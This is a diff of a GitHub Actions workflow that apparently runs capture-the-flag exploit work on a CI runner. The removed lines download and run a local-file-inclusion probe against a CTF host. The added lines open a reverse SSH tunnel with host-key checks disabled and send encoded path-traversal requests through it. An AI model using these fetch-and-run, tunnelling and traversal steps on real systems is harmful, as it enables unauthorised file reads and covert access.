@@ -9,14 +9,36 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 4
     steps:
-      - name: Test depth-4 local cache read
+      - name: Test traversal-preserving tunnel
         shell: bash
-        env:
-          TARGET: https://64d55bf19201477e84d7.kit.sasc.tf:443
         run: |
           set -euo pipefail
-          curl -fsSL https://raw.githubusercontent.com/DIA-SMT/botAmbiente-back/ctf-dfo-run-20260829/ctf/lfi_depth4_probe.py -o /tmp/lfi.py
-          curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /tmp/cloudflared
-          chmod +x /tmp/cloudflared
-          if ! command -v pdftoppm >/dev/null || ! command -v tesseract >/dev/null; then sudo apt-get update && sudo apt-get install -y poppler-utils tesseract-ocr; fi
-          python3 /tmp/lfi.py
+          cat >/tmp/srv.py <<'PY'
+          import http.server
+          class H(http.server.BaseHTTPRequestHandler):
+              def do_GET(self):
+                  print('SERVER_PATH='+repr(self.path),flush=True)
+                  b=('PATH='+self.path+'\n').encode()
+                  self.send_response(200); self.send_header('Content-Type','text/plain'); self.send_header('Content-Length',str(len(b))); self.end_headers(); self.wfile.write(b)
+              def log_message(self,fmt,*args): print('HTTPLOG '+fmt%args,flush=True)
+          http.server.ThreadingHTTPServer(('127.0.0.1',8765),H).serve_forever()
+          PY
+          python3 /tmp/srv.py > /tmp/srv.log 2>&1 &
+          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ServerAliveInterval=15 -o ExitOnForwardFailure=yes -R 80:localhost:8765 nokey@localhost.run > /tmp/tunnel.log 2>&1 &
+          TPID=$!
+          for i in $(seq 1 30); do
+            cat /tmp/tunnel.log || true
+            URL=$(grep -Eo 'https://[A-Za-z0-9.-]+' /tmp/tunnel.log | head -1 || true)
+            [ -n "$URL" ] && break
+            sleep 2
+          done
+          echo "URL=$URL"
+          [ -n "$URL" ]
+          curl -sv --path-as-is "$URL/normal" -o /tmp/a 2>&1 || true
+          cat /tmp/a || true
+          curl -sv --path-as-is "$URL/%2e%2e/%2e%2e/TRAVTEST" -o /tmp/b 2>&1 || true
+          cat /tmp/b || true
+          sleep 2
+          echo '=== SERVER LOG ==='
+          cat /tmp/srv.log
+          kill $TPID || true
